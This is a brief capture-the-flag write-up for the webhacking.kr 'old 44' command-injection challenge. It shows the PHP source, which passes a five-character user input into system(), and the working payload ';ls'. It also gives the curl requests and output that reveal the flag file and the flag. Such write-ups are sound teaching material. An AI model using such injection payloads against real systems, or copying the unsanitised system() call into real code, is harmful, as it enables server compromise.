# Old 44    Command Injection

URL: [http://webhacking.kr:10005/](http://webhacking.kr:10005/?view_source=1)
Source: [http://webhacking.kr:10005/?view_source=1](http://webhacking.kr:10005/?view_source=1)

```php
<?php
  if($_GET['view_source']){ highlight_file(__FILE__); exit; }
?><html>
<head>
<title>Challenge 44</title>
</head>
<body>
<?php
  if($_POST['id']){
    $id = $_POST['id'];
    $id = substr($id,0,5);
    system("echo 'hello! {$id}'"); // You just need to execute ls
  }
?>
<center>
<form method=post action=index.php name=htmlfrm>
name : <input name=id type=text maxlength=5><input type=submit value='submit'>
</form>
<a href=./?view_source=1>view-source</a>
</center>
</body>
</html>
```

Run the server locally and fuzz inputs:

![old-44.png](/assets/ctf/webhacking.kr/old-44.png)

Final payload:
```bash
';ls'
```

```bash
└─$ curl http://webhacking.kr:10005/index.php -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f' -d "id=';ls'"
<html>
<head>
<title>Challenge 44</title>
</head>
<body>
hello!
flag_29cbb98dafb4e471117fec409148e9386753569e
index.php
<center>
<form method=post action=index.php name=htmlfrm>
name : <input name=id type=text maxlength=5><input type=submit value='submit'>
</form>
<a href=./?view_source=1>view-source</a>
</center>
</body>
</html>
```

```bash
└─$ curl http://webhacking.kr:10005/flag_29cbb98dafb4e471117fec409148e9386753569e -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f'
FLAG{y2u.be/sW3RT0tF020}
```